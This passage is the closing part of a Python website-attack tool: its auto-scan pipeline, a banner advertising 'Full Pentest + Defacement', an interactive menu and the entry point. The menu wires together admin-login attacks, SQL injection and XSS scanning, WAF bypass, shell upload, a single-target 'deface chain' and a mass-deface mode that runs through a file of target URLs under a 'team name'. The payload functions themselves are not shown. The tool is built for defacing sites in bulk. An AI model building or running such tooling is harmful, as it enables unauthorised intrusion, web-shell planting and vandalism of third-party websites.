        RESULTS.data["wpscan"] = wpscan(url)
    elif b and "joomla" in b.lower():
        RESULTS.data["cms"] = "Joomla"
        print_good("CMS: Joomla")
    elif b and "drupal" in b.lower():
        RESULTS.data["cms"] = "Drupal"
        print_good("CMS: Drupal")

    find_config_leaks(url)
    admins = find_admin_panel(url)
    for a_url, code, kind in admins[:3]:
        if "login" in a_url.lower() or "form" in str(kind) or "auth" in str(kind).lower():
            attack_login(a_url)
            break

    fuzz_directories(url)
    scan_ports(url)

    params = mine_parameters(url) if "?" not in url else None
    auto_sqli_scan(url, params=list(params) if params else None)
    probe = url if "?" in url else (f"{url}?{sorted(params)[0]}=1" if params else url)
    max_cols, col_params = detect_columns(probe)
    if max_cols:
        find_vulnerable_columns(probe, max_cols, col_params)
    xss_scan(url, params=list(params) if params else None)

    if "?" in url or params:
        print_section(" SQLMap ")
        if input(f"{YELLOW}[?] Run sqlmap? (y/n): {NC}").strip().lower() == "y":
            auto_sqlmap_with_bypass(probe)

    RESULTS.finish()
    print_summary()

    print(f"\n{YELLOW}[?] Export report?{NC}")
    print(f"  {GREEN}[1]{NC} JSON  {GREEN}[2]{NC} TXT  {GREEN}[3]{NC} Both  {GREEN}[4]{NC} None")
    ch = input(f"{YELLOW}[?] Choice: {NC}").strip()
    if ch in ("1", "3"):
        export_json()
    if ch in ("2", "3"):
        export_txt()

# ================================================================
# SECTION 22 — BANNER + MENU
# ================================================================

def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{GREEN}
█▀▄ █ █▀▄ ▀█▀ █ █   █▀▀ █▀▀ █▀█ █▀█
█ █ █ █▀▄  █  ▀█▀   ▀▀█ █   █▀█ █ █
▀▀  ▀ ▀ ▀  ▀   ▀    ▄▄█ ▀▀▀ ▀ ▀ █ █

{NC}{YELLOW}  Author : {AUTHOR}{NC}
{YELLOW}  Version: {VERSION} — Full Pentest + Defacement{NC}
{YELLOW}  Platform: {platform.system()} {platform.release()}{'  (Termux)' if IS_TERMUX else ''}{NC}
{YELLOW}  Modules: recon, WPScan, CVE, SQLi, XSS, admin, WAF bypass,{NC}
{YELLOW}           deface, mass-deface, config leaks, summary report{NC}
""")


def interactive_menu():
    while True:
        show_banner()
        print(f"""{CYAN}Options:{NC}
  {GREEN}[1]{NC}  FULL AUTO SCAN (with summary report)
  {GREEN}[2]{NC}  WAF Detect + Auto Bypass
  {GREEN}[3]{NC}  SQL Injection Scan
  {GREEN}[4]{NC}  XSS Scan
  {GREEN}[5]{NC}  CMS Detect + WPScan
  {GREEN}[6]{NC}  Admin Finder + Auth Attack
  {GREEN}[7]{NC}  Directory Fuzzing
  {GREEN}[8]{NC}  Port Scan
  {GREEN}[9]{NC}  Headers
  {GREEN}[10]{NC} SSL/TLS
  {GREEN}[11]{NC} CVE Scanner
  {GREEN}[12]{NC} Parameter Miner
  {GREEN}[13]{NC} Column Detection
  {GREEN}[14]{NC} Vulnerable Column Finder
  {GREEN}[15]{NC} SQLMap WAF Bypass
  {GREEN}[16]{NC} Nikto
  {GREEN}[17]{NC} Config/Backup Leak Scan
  {GREEN}[18]{NC} Shell Upload Attempt
  {MAGENTA}[19]{NC} DEFACE CHAIN (single target)
  {MAGENTA}[20]{NC} MASS DEFACE (from file)
  {CYAN}[21]{NC} Re-check / install requirements
  {CYAN}[22]{NC} Show last scan summary
  {CYAN}[23]{NC} Export last scan (JSON/TXT)
  {RED}[0]{NC}  Exit""")
        c = input(f"\n{YELLOW}[?] Choice: {NC}").strip()
        if c == "0":
            sys.exit(0)
        if c == "21":
            install_all(auto=True)
            input(f"\n{YELLOW}Enter to continue...{NC}")
            continue
        if c == "22":
            if RESULTS.target is None:
                print_warn("No scan yet")
            else:
                print_summary()
            input(f"\n{YELLOW}Enter to continue...{NC}")
            continue
        if c == "23":
            if RESULTS.target is None:
                print_warn("No scan yet")
            else:
                print(f"{GREEN}[1]{NC} JSON  {GREEN}[2]{NC} TXT  {GREEN}[3]{NC} Both")
                ch = input(f"{YELLOW}[?] Choice: {NC}").strip()
                if ch in ("1", "3"):
                    export_json()
                if ch in ("2", "3"):
                    export_txt()
            input(f"\n{YELLOW}Enter to continue...{NC}")
            continue

        print()
        team = input(f"{MAGENTA}[?] Enter your team name: {NC}").strip() or "Anonymous"

        if c == "20":
            fpath = input(f"{YELLOW}[?] Targets file (one URL per line): {NC}").strip()
            if not os.path.exists(fpath):
                print_error("File not found")
                continue
            with open(fpath) as f:
                targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            if not targets:
                print_error("Empty")
                continue
            print_section(" MASS DEFACEMENT ")
            results = []
            for i, t in enumerate(targets, 1):
                print_info(f"\n[{i}/{len(targets)}] {t}")
                r = run_deface_chain(t, team=team)
                results.append((t, r))
            print_section(" Mass Results ")
            for t, r in results:
                status = "OK" if r and r.get("shell_url") else "FAIL"
                color = GREEN if status == "OK" else RED
                print(f"{color}[{status}]{NC} {t}")
            input(f"\n{YELLOW}Enter to continue...{NC}")
            continue

        url = input(f"{YELLOW}[?] Target URL: {NC}").strip()
        if not url:
            continue
        if not url.startswith("http"):
            url = "http://" + url

        RESULTS.__init__()
        RESULTS.start(url, team=team)
        prime_baseline(url)

        try:
            if c == "1":
                run_auto_scan(url, team=team)
            elif c == "2":
                detect_waf(url)
                auto_waf_bypass(url)
            elif c == "3":
                auto_sqli_scan(url)
            elif c == "4":
                xss_scan(url)
            elif c == "5":
                s, h, b = http_get(url, timeout=10)
                if b and ("wp-content" in b or "wp-includes" in b):
                    RESULTS.data["cms"] = "WordPress"
                    RESULTS.data["wpscan"] = wpscan(url)
                else:
                    print_warn("Not WordPress")
            elif c == "6":
                for a, code, kind in find_admin_panel(url):
                    if "login" in a.lower() or "form" in str(kind) or "auth" in str(kind).lower():
                        attack_login(a)
                        break
            elif c == "7":
                fuzz_directories(url)
            elif c == "8":
                scan_ports(url)
            elif c == "9":
                analyze_headers(url)
            elif c == "10":
                check_ssl(url)
            elif c == "11":
                RESULTS.data["cve"] = cve_scan(url) or []
            elif c == "12":
                mine_parameters(url)
            elif c == "13":
                detect_columns(url)
            elif c == "14":
                mc, cp = detect_columns(url)
                if mc:
                    find_vulnerable_columns(url, mc, cp)
            elif c == "15":
                auto_sqlmap_with_bypass(url)
            elif c == "16":
                auto_nikto_scan(url)
            elif c == "17":
                find_config_leaks(url)
            elif c == "18":
                find_upload_endpoint(url, team=team)
            elif c == "19":
                run_deface_chain(url, team=team)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Interrupted{NC}")
        except Exception as e:
            print_error(f"{e}")
            RESULTS.add_error(str(e))

        RESULTS.finish()

        if c in ("3", "4", "5", "6", "11", "14", "17", "18", "19"):
            print(f"\n{YELLOW}[?] Show summary? (y/n): {NC}", end="")
            if input().strip().lower() == "y":
                print_summary()
                print(f"\n{YELLOW}[?] Export? {GREEN}[1]{NC} JSON  {GREEN}[2]{NC} TXT  {GREEN}[3]{NC} Both  {GREEN}[4]{NC} None: {NC}", end="")
                ch = input().strip()
                if ch in ("1", "3"):
                    export_json()
                if ch in ("2", "3"):
                    export_txt()

        input(f"\n{YELLOW}Enter to continue...{NC}")


def main():
    try:
        signal.signal(signal.SIGINT, lambda *_: sys.exit(0))
        args = [a for a in sys.argv[1:] if not a.startswith("--")]
        if args:
            u = args[0]
            if not u.startswith("http"):
                u = "http://" + u
            team = args[1] if len(args) > 1 else "Anonymous"
            run_auto_scan(u, team=team)
        else:
            interactive_menu()
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
